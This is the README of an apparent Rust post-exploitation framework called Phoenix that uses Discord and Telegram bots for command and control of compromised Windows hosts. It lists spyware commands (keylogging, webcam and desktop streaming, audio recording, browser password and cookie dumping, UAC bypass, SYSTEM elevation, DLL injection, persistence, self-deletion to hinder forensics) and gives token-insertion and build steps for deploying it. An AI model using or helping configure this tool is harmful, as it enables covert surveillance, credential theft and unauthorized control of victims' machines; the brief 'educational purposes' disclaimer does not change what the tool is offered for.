# Phoenix-Framework

Phoenix is an async based post exploitation framework that abuses trusted sites for C2.

<p align="center">
  <img src="https://img.shields.io/badge/Language-Rust-orange?style=for-the-badge&logo=rust&logoColor=white" />
  <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge&logo=windows&logoColor=white" />
  <img src="https://img.shields.io/badge/Arch-x64-lightgrey?style=for-the-badge" />
</p>


#

## Supported Platforms
Phoenix currently supports the following platforms via their Bot APIs:
 - Discord
 - Telegram
 - Reddit (Coming soon)

Phoenix offers the basic following features :
- String Obfuscation
- Automatic download of attachments uploaded by users in chat
- Self destruction functionality to hinder forensic efforts
- Keylogging with window title capture capability
- Webcam & Desktop capture and live streaming
- Browser data harvesting
-  ...
  
#
## Commands

```

Command             Description
-------             -----------

/hello        		Check if the bot is acive on the host
/help         		Print help message
/persist      		Maintain access after reboot. (Requires UAC bypass)
/sleep        		Sleep. Usage: /sleep (seconds)
/reboot       		Reboot the host
/shutdown     		Shutdown the host
/exit         		End the session
/self_del     		Self-delete the executable 

/pwd         	 	Print working directory
/dir          		List working directory
/cd           		Change directory. Usage: /cd (path)
/search       		Search for files. Usage: /search (path) (file)
/upload       		Upload files. Usage: /upload (file), /upload *.jpg
/uid          		Get the user id
/users        		List the available users
/privs        		List the privileges
/sysinfo      		Print system informations
/location     		Retrieve geolocation informations

/hw           		List installed hardware
/sw           		list installed software
/drv          		List connected drives
/net          		List network Adapters
/pid          		Show the current process ID
/ps           		List running processes
/pkill        		Kill a process by ID
/exec         		Execute a command

/chat         		Display a custom message
/webcam_list      	List available webcams
/webcam_snap      	Take a webcam snapshot: Usage: /webcam_snap (index)
/recaudio         	Record audio. Usage: /recaudio (seconds)
/screenshot       	Take a screenshot

/keylog          	Start keylogging
/keylog_stop      	Stop keylogging threads

/browser_dump     	Dump browser data
/clipboard        	Dump clipboard data

/stream_desktop   	Live stream the host desktop
/stream_webcam    	Live stream the host webcam
/stream_stop      	Stop live streaming threads *** needs work 

/get_system       	Elevate privileges to SYSTEM
/bypass_uac       	Bypass UAC prompts

/inject 		  	Inject a target process. Usage: /inject (dll_path)
```
#

>  [!NOTE]
>
> Phoenix supports data harvesting of the following browsers: `Chrome`, `Edge`, `Brave`, and `firefox`.
> - Firefox password decryption is not supported currently!
> - Chromium dumping module is based on the open source project: https://github.com/Maldev-Academy/DumpBrowserSecrets/tree/main/DllExtractChromiumSecrets.
>   
>The table below showcases the list of harvested data for each supported browser : 
> 
>|             | Chrome/Edge/Brave | Firefox |
>|-------------|-------------------|---------|
>| History     |        ✅        |   ✅    |
>| Cookies     |        ✅        |   ✅    |
>| Autofills   |        ✅        |   ✅    |
>| Credi Cards |        ✅        |   ✅    |
>| Cookies     |        ✅        |   ✅    |
>| logins      |        ✅        |     ❌    |
>

#

## Usage

Phoenix is currently implementing simple XOR obfuscation, meaning the tokens will still be hardcoded in the binary. The obfuscation is just a basic defence to prevent casual string inspection, not to stop a skilled reverse engineers.


#### + Ngrok:
Ngrok is essential for tunnling the live streaming traffic, phoenix would not be able to stream the host desktop/webcam without a proper ngrok token.

1. Sign up for a ngrok account: https://ngrok.com/
2. Inside `/src/tunnel.rs`, replace the variable `token` with your real actual token :
```
let token = obfuscate!("YOUR_NGROK_TOKEN");
```

#

#### + Telegram:
1. Create a bot: https://core.telegram.org/bots/tutorial
2. Inside `/src/telegram.rs`, replace the variables `bot_token` and `id` with your real bot token and chat id:
```
let bot_token  = obfuscate!("YOUR_TELEGRAM_TOKEN");
let id: i64    = 123456789;
``` 
3. Compile the binary:
```
> cargo build --release --bin telegram
```

#

#### + Discord:
1. Create a bot: https://discord.com/developers/applications
2. Inside `/src/discord.rs`, replace the variable `token` with your real bot token:
```
let token  = obfuscate!("YOUR_DISCORD_TOKEN");
``` 
3. Compile the binary:
```
> cargo build --release --bin discord
```

## PoC

> [!IMPORTANT]
The generated binaries require administrator privileges to function properly.

#
<img width="1049" height="818" alt="screenshot" src="https://github.com/user-attachments/assets/5beeb511-41a0-4264-ad8c-40d14430de45" />

#

## 🔒 DISCLAIMER
> [!CAUTION]
>This project is provided for educational and research purposes only. You are responsible for ensuring you have proper authorization before using this tool. The author assumes no liability for misuse.


## 🤝 Collaborations
Contributions and suggestions are welcome! If you have "ethical" business inquiries or would like to collaborate, feel free to reach out at: M0kht4rHacks@protonmail.com
